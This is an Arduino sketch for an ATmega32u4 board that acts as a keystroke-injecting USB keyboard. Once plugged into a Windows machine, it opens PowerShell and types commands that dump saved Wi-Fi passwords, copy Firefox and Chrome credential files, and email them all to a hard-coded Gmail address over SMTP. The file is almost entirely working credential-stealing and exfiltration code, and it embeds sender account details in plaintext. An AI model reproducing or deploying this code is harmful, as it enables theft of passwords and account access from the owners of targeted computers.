/*
 * Humberto Keymur
 * Send information from windows using powershell via email
 * Wifi passwords
 * Firefox passwords
 * Chrome passwords
 * ATmega32u4 
 */

#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(3000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(1000);

  Keyboard.print("powershell");
  //Keyboard.print("powershell ");
  //Keyboard.write(47);// -
  //Keyboard.print("WindowStyle Minimized");

  typeKey(KEY_RETURN);

  //delay(500);
  delay(2000);

  /*for (int i=0; i <= 128; i++){
      Keyboard.println(i);
      Keyboard.write(i);
      Keyboard.println("");
  } */

  
  /*GET WIFI PASSWORDS
  netsh wlan show profiles | %{$_.split(':')[1]} | Where-Object {$_ -match '\S'} | %{$_.trimstart("")} > data.txt
  foreach ($i in get-content data.txt) {
    netsh wlan show profiles "$i" key=clear >> wifipasswords.txt 
  }
  */

  //Keyboard.print("netsh wlan show profiles |%{$_.split(':')[1]}|Where-Object {$_ -match '[aA-zZ0-9]'}|%{$_.trimstart("")}|Out-File data.txt");
  Keyboard.print("netsh wlan show profiles ");
  
  //%{$_.split(':')[1]}
  Keyboard.write(96);// |
  Keyboard.write(37);// %
  Keyboard.write(39);// {
  Keyboard.write(36);// $
  Keyboard.write(63);// _
  Keyboard.write(46);// .
  Keyboard.print("split");
  Keyboard.write(42);// (
  Keyboard.write(45);// '
  Keyboard.write(62);// :
  Keyboard.write(45);// '
  Keyboard.write(40);// )
  Keyboard.write(34);// [
  Keyboard.print("1");
  Keyboard.write(124);// ]
  Keyboard.write(92);// }
  
  //Where-Object {$_ -match '[a-z]'}
  Keyboard.write(96);// |
  Keyboard.print("Where");
  Keyboard.write(47);// -
  Keyboard.print("Object ");
  Keyboard.write(39);// {
  Keyboard.write(36);// $
  Keyboard.write(63);// _
  Keyboard.print(" ");
  Keyboard.write(47);// -
  Keyboard.print("match ");
  Keyboard.write(45);// '
  Keyboard.write(34);// [
  Keyboard.print("aA");
  Keyboard.write(47);// -
  Keyboard.print("zZ0");
  Keyboard.write(47);// -
  Keyboard.print("9");
  Keyboard.write(124);// ]
  Keyboard.write(45);// '
  Keyboard.write(92);// }
  
  // %{$_.trimstart("")}
  Keyboard.write(96);// |
  Keyboard.write(37);// %
  Keyboard.write(39);// {
  Keyboard.write(36);// $
  Keyboard.write(63);// _
  Keyboard.write(46);// .
  Keyboard.print("trimstart");
  Keyboard.write(42);// (
  Keyboard.write(64);// "
  Keyboard.write(64);// "
  Keyboard.write(40);// )
  Keyboard.write(92);// }
  
  // Out-File data.txt
  Keyboard.write(96);// |
  Keyboard.print("Out");
  Keyboard.write(47);// -
  Keyboard.print("File data.txt");
  typeKey(KEY_RETURN);
  
  //Keyboard.print('foreach ($i in get-content data.txt) { netsh wlan show profiles "$i" key=clear | Out-File -append wifipasswords.txt }');
  Keyboard.print("foreach");
  Keyboard.write(42);// (
  Keyboard.write(36);// $
  Keyboard.print("i in get");
  Keyboard.write(47);// -
  Keyboard.print("content data.txt");
  Keyboard.write(40);// )
  Keyboard.write(39);// {
  Keyboard.print("netsh wlan show profiles ");
  Keyboard.write(64);// " 
  Keyboard.write(36);// $
  Keyboard.print("i");
  Keyboard.write(64);// "
  Keyboard.print(" key");
  Keyboard.write(41);// =
  Keyboard.print("clear ");
  Keyboard.write(96);// |
  Keyboard.print("Out");
  Keyboard.write(47);// -
  Keyboard.print("File ");
  Keyboard.write(47);// -
  Keyboard.print("append ");
  Keyboard.print("wifipasswords.txt");
  Keyboard.write(92);// }
  typeKey(KEY_RETURN);

  /*COPY FIREFOX PASSWORDS
    cp ~/AppData/Roaming\Mozilla\Firefox\Profiles/*.default/logins.json .
    cp ~/AppData/Roaming\Mozilla\Firefox\Profiles/*.default/key3.db .
    cp ~/AppData/Roaming\Mozilla\Firefox\Profiles/*.default/cert8.db .
   */

  Keyboard.print("cp AppData");
  Keyboard.write(38);// /
  Keyboard.print("Roaming");
  Keyboard.write(38);// /
  Keyboard.print("Mozilla");
  Keyboard.write(38);// /
  Keyboard.print("Firefox");
  Keyboard.write(38);// /
  Keyboard.print("Profiles");
  Keyboard.write(38);// /
  Keyboard.write(125);// *
  Keyboard.print(".default");
  Keyboard.write(38);// /
  Keyboard.print("logins.json .");
  typeKey(KEY_RETURN);

  Keyboard.print("cp AppData");
  Keyboard.write(38);// /
  Keyboard.print("Roaming");
  Keyboard.write(38);// /
  Keyboard.print("Mozilla");
  Keyboard.write(38);// /
  Keyboard.print("Firefox");
  Keyboard.write(38);// /
  Keyboard.print("Profiles");
  Keyboard.write(38);// /
  Keyboard.write(125);// *
  Keyboard.print(".default");
  Keyboard.write(38);// /
  Keyboard.print("key3.db .");
  typeKey(KEY_RETURN);

  Keyboard.print("cp AppData");
  Keyboard.write(38);// /
  Keyboard.print("Roaming");
  Keyboard.write(38);// /
  Keyboard.print("Mozilla");
  Keyboard.write(38);// /
  Keyboard.print("Firefox");
  Keyboard.write(38);// /
  Keyboard.print("Profiles");
  Keyboard.write(38);// /
  Keyboard.write(125);// *
  Keyboard.print(".default");
  Keyboard.write(38);// /
  Keyboard.print("cert8.db .");
  typeKey(KEY_RETURN);


  /*COPY CHROME PASSWORDS
    cp ~/AppData\Local\Google\Chrome\User Data\Default/Login Data chromepasswords
  */
  
  
  Keyboard.print("cp ");
  Keyboard.write(45);// '
  Keyboard.print("AppData");
  Keyboard.write(38);// /
  Keyboard.print("Local");
  Keyboard.write(38);// /
  Keyboard.print("Google");
  Keyboard.write(38);// /
  Keyboard.print("Chrome");
  Keyboard.write(38);// /
  Keyboard.print("User Data");
  Keyboard.write(38);// /
  Keyboard.print("Default");
  Keyboard.write(38);// /
  Keyboard.print("Login Data");
  Keyboard.write(45);// '
  Keyboard.print(" chromepasswords");
  typeKey(KEY_RETURN);
  

  /*SEND EMAIL INFO
  */
  //$SMTPServer = "smtp.gmail.com"
  Keyboard.write(36);// $
  Keyboard.print("SMTPServer");
  Keyboard.write(41);// =
  Keyboard.write(64);// "
  Keyboard.print("smtp.gmail.com");
  Keyboard.write(64);// "
  typeKey(KEY_RETURN);
  //$SMTPPort = "587"
  Keyboard.write(36);// $
  Keyboard.print("SMTPPort");
  Keyboard.write(41);// =
  Keyboard.write(64);// "
  Keyboard.print("587");
  Keyboard.write(64);// "
  typeKey(KEY_RETURN);
  //$Username = "k3y1andhk@gmail.com"
  Keyboard.write(36);// $
  Keyboard.print("Username");
  Keyboard.write(41);// =
  Keyboard.write(64);// "
  Keyboard.print("k3y1andhk");
  Keyboard.press(KEY_RIGHT_ALT);
  Keyboard.print("q");
  Keyboard.release(KEY_RIGHT_ALT);
  Keyboard.press(KEY_RIGHT_ALT);
  Keyboard.print("2");
  Keyboard.release(KEY_RIGHT_ALT);
  Keyboard.print("gmail.com");
  Keyboard.write(64);// "
  typeKey(KEY_RETURN);
  //$Password = "hacking#"
  Keyboard.write(36);// $
  Keyboard.print("Password");
  Keyboard.write(41);// =
  Keyboard.write(64);// "
  Keyboard.print("hacking#");
  Keyboard.write(64);// "
  typeKey(KEY_RETURN);
  
  //$to = "hkeyland@gmail.com"
  Keyboard.write(36);// $
  Keyboard.print("to");
  Keyboard.write(41);// =
  Keyboard.write(64);// "
  Keyboard.print("hkeyland");
  Keyboard.press(KEY_RIGHT_ALT);
  Keyboard.print("q");
  Keyboard.release(KEY_RIGHT_ALT);
  Keyboard.press(KEY_RIGHT_ALT);
  Keyboard.print("2");
  Keyboard.release(KEY_RIGHT_ALT);
  Keyboard.print("gmail.com");
  Keyboard.write(64);// "
  typeKey(KEY_RETURN);
  
  //$subject = "Datos encontrados"
  Keyboard.write(36);// $
  Keyboard.print("subject");
  Keyboard.write(41);// =
  Keyboard.write(64);// "
  Keyboard.print("Datos encontrados");
  Keyboard.write(64);// "
  typeKey(KEY_RETURN);
  
  //$body = "Contenido del mensaje"
  Keyboard.write(36);// $
  Keyboard.print("body");
  Keyboard.write(41);// =
  Keyboard.write(64);// "
  Keyboard.print("Contenido del mensaje");
  Keyboard.write(64);// "
  typeKey(KEY_RETURN);
  
  //$attachment = "./wifipasswords.txt"
  Keyboard.write(36);// $
  Keyboard.print("attachment");
  Keyboard.write(41);// =
  Keyboard.write(64);// "
  Keyboard.print(".");
  Keyboard.write(38);// /
  Keyboard.print("wifipasswords.txt");
  Keyboard.write(64);// "
  typeKey(KEY_RETURN);
  //$attachment2 = "./logins.json"
  Keyboard.write(36);// $
  Keyboard.print("attachment2");
  Keyboard.write(41);// =
  Keyboard.write(64);// "
  Keyboard.print(".");
  Keyboard.write(38);// /
  Keyboard.print("logins.json");
  Keyboard.write(64);// "
  typeKey(KEY_RETURN);
  //$attachment3 = "./key3.db"
  Keyboard.write(36);// $
  Keyboard.print("attachment3");
  Keyboard.write(41);// =
  Keyboard.write(64);// "
  Keyboard.print(".");
  Keyboard.write(38);// /
  Keyboard.print("key3.db");
  Keyboard.write(64);// "
  typeKey(KEY_RETURN);
  //$attachment4 = "./cert8.db "
  Keyboard.write(36);// $
  Keyboard.print("attachment4");
  Keyboard.write(41);// =
  Keyboard.write(64);// "
  Keyboard.print(".");
  Keyboard.write(38);// /
  Keyboard.print("cert8.db");
  Keyboard.write(64);// "
  typeKey(KEY_RETURN);
  //$attachment5 = "./chromepasswords"
  Keyboard.write(36);// $
  Keyboard.print("attachment5");
  Keyboard.write(41);// =
  Keyboard.write(64);// "
  Keyboard.print(".");
  Keyboard.write(38);// /
  Keyboard.print("chromepasswords");
  Keyboard.write(64);// "
  typeKey(KEY_RETURN);
  
  //$message = New-Object System.Net.Mail.MailMessage
  Keyboard.write(36);// $
  Keyboard.print("message");
  Keyboard.write(41);// =
  Keyboard.print(" New");
  Keyboard.write(47);// -
  Keyboard.print("Object System.Net.Mail.MailMessage");
  typeKey(KEY_RETURN);
  
  //$message.subject = $subject
  Keyboard.write(36);// $
  Keyboard.print("message.subject");
  Keyboard.write(41);// =
  Keyboard.write(36);// $
  Keyboard.print("subject");
  typeKey(KEY_RETURN);
  
  //$message.body = $body
  Keyboard.write(36);// $
  Keyboard.print("message.body");
  Keyboard.write(41);// =
  Keyboard.write(36);// $
  Keyboard.print("body");
  typeKey(KEY_RETURN);
  
  //$message.to.add($to)
  Keyboard.write(36);// $
  Keyboard.print("message.to.add");
  Keyboard.write(42);// (
  Keyboard.write(36);// $
  Keyboard.print("to");
  Keyboard.write(40);// )
  typeKey(KEY_RETURN);

  //$message.from = $username
  Keyboard.write(36);// $
  Keyboard.print("message.from");
  Keyboard.write(41);// =
  Keyboard.write(36);// $
  Keyboard.print("username");
  typeKey(KEY_RETURN);
  
  //$message.attachments.add($attachment)
  Keyboard.write(36);// $
  Keyboard.print("message.attachments.add");
  Keyboard.write(42);// (
  Keyboard.write(36);// $
  Keyboard.print("attachment");
  Keyboard.write(40);// )
  typeKey(KEY_RETURN);
  //$message.attachments.add($attachment2)
  Keyboard.write(36);// $
  Keyboard.print("message.attachments.add");
  Keyboard.write(42);// (
  Keyboard.write(36);// $
  Keyboard.print("attachment2");
  Keyboard.write(40);// )
  typeKey(KEY_RETURN);
  //$message.attachments.add($attachment3)
  Keyboard.write(36);// $
  Keyboard.print("message.attachments.add");
  Keyboard.write(42);// (
  Keyboard.write(36);// $
  Keyboard.print("attachment3");
  Keyboard.write(40);// )
  typeKey(KEY_RETURN);
  //$message.attachments.add($attachment4)
  Keyboard.write(36);// $
  Keyboard.print("message.attachments.add");
  Keyboard.write(42);// (
  Keyboard.write(36);// $
  Keyboard.print("attachment4");
  Keyboard.write(40);// )
  typeKey(KEY_RETURN);
  //$message.attachments.add($attachment5)
  Keyboard.write(36);// $
  Keyboard.print("message.attachments.add");
  Keyboard.write(42);// (
  Keyboard.write(36);// $
  Keyboard.print("attachment5");
  Keyboard.write(40);// )
  typeKey(KEY_RETURN);

  //$smtp = New-Object System.Net.Mail.SmtpClient($SMTPServer, $SMTPPort);
  //$message.from = $username
  Keyboard.write(36);// $
  Keyboard.print("smtp");
  Keyboard.write(41);// =
  Keyboard.print("New");
  Keyboard.write(47);// -
  Keyboard.print("Object System.Net.Mail.SmtpClient");
  Keyboard.write(42);// (
  Keyboard.write(36);// $
  Keyboard.print("SMTPServer, ");
  Keyboard.write(36);// $
  Keyboard.print("SMTPPort");
  Keyboard.write(40);// )
  typeKey(KEY_RETURN);

  //$smtp.EnableSSL = $true
  Keyboard.write(36);// $
  Keyboard.print("smtp.EnableSSL");
  Keyboard.write(41);// =
  Keyboard.write(36);// $
  Keyboard.print("true");
  typeKey(KEY_RETURN);
  
  //$smtp.Credentials = New-Object System.Net.NetworkCredential($Username, $Password);
  Keyboard.write(36);// $
  Keyboard.print("smtp.Credentials");
  Keyboard.write(41);// =
  Keyboard.print("New");
  Keyboard.write(47);// -
  Keyboard.print("Object System.Net.NetworkCredential");
  Keyboard.write(42);// (
  Keyboard.write(36);// $
  Keyboard.print("Username, ");
  Keyboard.write(36);// $
  Keyboard.print("Password");
  Keyboard.write(40);// )
  typeKey(KEY_RETURN);
  
  //$smtp.send($message)
  Keyboard.write(36);// $
  Keyboard.print("smtp.send");
  Keyboard.write(42);// (
  Keyboard.write(36);// $
  Keyboard.print("message");
  Keyboard.write(40);// )
  typeKey(KEY_RETURN);


  delay(2000); 
  Keyboard.print("exit");
  typeKey(KEY_RETURN);
  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
